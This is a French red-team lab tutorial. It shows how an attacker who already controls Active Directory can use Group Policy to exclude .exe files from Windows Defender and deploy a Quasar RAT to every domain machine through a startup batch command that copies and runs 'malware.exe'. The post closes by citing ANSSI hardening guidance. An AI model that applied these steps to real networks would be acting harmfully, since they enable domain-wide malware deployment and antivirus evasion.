---
published: true
layout: post
title: "Une GPO pour les gouverner tous : Compromettre n'importe quel poste de l'Active Directory via une GPO"
description: "Cet article décrit comment compromettre un poste de l'Active Directory via une GPO."
lang: fr_FR
category: redteam,malware,active directory,gpo
---
![Compromission d'un poste de l'Active Directory via une GPO](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/illustration.PNG)

L'objectif principal d'Active Directory est de fournir des services centralisés d'identification et d'authentification à un réseau d'ordinateurs utilisant le système Windows, macOS ou encore Linux. Il permet également l'attribution et **l'application de stratégies de groupes** ainsi que **l'installation de mises à jour critiques** par les administrateurs.
L'Active Directory est donc le nerf de la guerre du pentester Red Team. En cas de compromissions de ce dernier, la partie est gagnée. L'attaquant peut alors rebondir sur les différents postes du domaine compromis.

## Exploitation de l'Active Directory pour installer un malware via un GPO
Dans cet article, je pars du postulat que **l'Active Directory est déjà compromis** et je m'intéresse donc à l'utilisation des stratégies de groupe.
L'idée est ici de déployer un malware sur tous les systèmes de l'Active Directory (ou un seul pour cibler un utilisateur en particulier). Bon mon lab est assez petit, car il ne se compose que d'un **Windows Server 2019 (Contrôleur de domaine)** et d'un **Windows 10** tous deux dans le domaine **mondomaine.local**.

### Création de la GPO malveillante
La première étape est de créer la GPO malveillante que je nommerai...*Installation Malware* qui est effective sur le domaine *mondomaine.local* et s'applique à **tous les utilisateurs authentifiés** :

[![Création de la GPO malveillante](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo.PNG)](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo.PNG)

### Exclusion de la détection du malware
Une des politiques de sécurité appliquée sera d'exclure la détection des fichiers ayant pour extension *.exe*.

Il faut donc dans la partie *Composants Windows* -> *Antivirus Windows Defender* -> *Exclusions* -> *Exclusion d'extensions*, créer une règle d'exclusion sur le *.exe*.

[![Exclusion de la détection des fichiers .exe](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_exclusion.PNG)](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_exclusion.PNG)

Tout exécutable **normalement détecté par Windows Defender** pourra ainsi être **exécuté sans être bloqué** par Windows Defender.

### Création du malware exécuté sur le poste de la cible
Pour l'exemple, j'utiliserai l'outil d'administration à distance (*Remote Administration Tool* ou *RAT*) [Quasar](https://github.com/quasar/Quasar) qui est libre et open source. Le *malware.exe* doit être placé dans le répertoire *C:\Windows\SYSVOL\sysvol\mondomaine.local\scripts*. Ce dossier est un partage administratif qui sera disponible sur le poste des utilisateurs du domaine à l'emplacement suivant `\\mondomaine.local\NETLOGON\\malware.exe`
Le malware aurait également pu être une charge *CobaltStrike*, un *reverse shell* ou tout autre exécutable / script comme un ransomware.

### Création du script de téléchargement du malware
Un script d'exécution doit être créé pour télécharger le logiciel malveillant. Le contenu du script à exécuter au démarrage du poste est le suivant :

```bat
copy \\mondomaine.local\NETLOGON\\malware.exe C:\Windows\malware.exe && C:\Windows\malware.exe
```
Le script doit également être placé dans le partage administratif :

[![Placement des logiciels malveillants dans SYSVOL](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/sysvol.PNG)](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/sysvol.PNG)

### Création de la GPO qui exécutera le script

La GPO qui exécutera le script au démarrage de l'ordinateur doit maintenant être créée. Pour ce faire, la catégorie *Paramètre Windows* -> *Scripts (démarrage/arrêt)* va être utilisée. Il faut alors spécifier le script en question qui sera démarré :

[![Création de la GPO qui exécute le script de téléchargement du malware](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo_execution_malware.PNG)](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo_execution_malware.PNG)

Une fois le redémarrage de l'ordinateur, le script est alors exécuté qui lui même téléchargera le logiciel malveillant et l'exécutera. Du côté de l'attaquant, la victime est alors visible :

[![Liste des PC compromis](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/liste_pc_compromis.PNG)](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/liste_pc_compromis.PNG)

## Conclusion
Cet exemple d'exploitation prouve que le contrôleur de domaine est vraiment une pièce maîtresse du réseau d'entreprise et qu'il doit être protégé au maximum. Il y a plein d'autres scénarii imaginables.

De nombreuses recommandations sont disponibles pour sécuriser un Active Directory et cet exemple est trop vaste pour lister une recommandation précise.
L'ANSSI a publié un [guide](https://www.ssi.gouv.fr/guide/recommandations-de-securite-relatives-a-active-directory/) qui a pour objectif de fournir des recommandations et des procédures permettant la sécurisation d’un annuaire Active Directory.